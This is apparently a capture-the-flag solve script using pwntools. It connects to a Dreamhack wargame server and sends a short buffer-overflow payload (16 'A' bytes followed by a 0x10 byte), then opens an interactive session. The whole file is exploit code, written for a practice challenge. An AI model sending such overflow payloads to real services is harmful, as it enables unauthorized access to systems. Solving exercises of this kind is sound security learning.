from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17970
r = remote(HOST, PORT)

r.sendline(b'A'*0x10 + b'\x10')

r.interactive()